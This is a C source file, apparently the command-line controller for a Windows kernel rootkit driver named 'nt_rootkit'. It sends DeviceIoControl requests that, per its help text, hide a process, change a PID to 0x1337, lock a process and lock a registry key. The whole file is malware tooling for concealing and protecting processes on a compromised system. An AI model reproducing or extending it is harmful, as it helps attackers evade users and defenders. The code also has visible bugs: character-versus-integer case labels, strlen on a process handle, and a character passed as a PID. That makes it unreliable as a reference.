#include <stdio.h>
#include <Windows.h>
#include "ioctl_globals.h"

int main(int argc, char* argv[], char* envp[])
{
        BOOL status = FALSE;
        HANDLE device = INVALID_HANDLE_VALUE;
        DWORD ret_bytes = 0;
        CHAR input_buf[128] = {0};
        CHAR output_buf[128] = {0};

        device = CreateFileW(L"\\\\.\\nt_rootkit",
                GENERIC_WRITE | GENERIC_READ | GENERIC_EXECUTE, 0, 0,
                OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

        if (argc > 1) {
                switch (*argv[1]) {
                case 0:
                        if (*argv[2] > 0) {
                                RtlCopyMemory(input_buf, argv[2], 
                                        strlen(argv[2]));
                                status = DeviceIoControl(
                                        device, IO_HIDE_PROC,
                                        input_buf, sizeof(input_buf), 
                                        output_buf, sizeof(output_buf),
                                        &ret_bytes, (LPOVERLAPPED)NULL
                                );
                        }
                        break;
                case 1:
                        if (*argv[2] > 0) {
                                RtlCopyMemory(input_buf, argv[2],
                                        strlen(argv[2]));
                                status = DeviceIoControl(
                                        device, IO_PID_PROC,
                                        input_buf, sizeof(input_buf),
                                        output_buf, sizeof(output_buf),
                                        &ret_bytes, (LPOVERLAPPED)NULL);
                        }
                        break;
                case 2:
                        if (*argv[2] > 0) {
                                HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS,
                                        FALSE, *argv[2]);
                                RtlCopyMemory(input_buf, proc,
                                        strlen(proc));
                                status = DeviceIoControl(
                                        device, IO_LOCK_PROC,
                                        input_buf, sizeof(input_buf),
                                        output_buf, sizeof(output_buf),
                                        &ret_bytes, (LPOVERLAPPED)NULL);
                                CloseHandle(proc);
                        }
                        break;
                case 3:
                        if (strlen(argv[2]) > 1) {
                                RtlCopyMemory(input_buf, argv[2],
                                        strlen(argv[2]));
                                status = DeviceIoControl(
                                        device, IO_LOCK_KEY,
                                        input_buf, sizeof(input_buf),
                                        output_buf, sizeof(output_buf),
                                        &ret_bytes, (LPOVERLAPPED)NULL);
                        }
                        break;
                case 'h':
                        printf("\n0 [PID]\tHide a process.\n"
                               "1 [PID]\tChange a PID to 0x1337\n"
                               "2 [PID]\tLock a PID\n"
                               "3 [REG_KEY]\tLock a Reg Key\n\n");
                        break;
                }
        }

        CloseHandle(device);
        return status;
}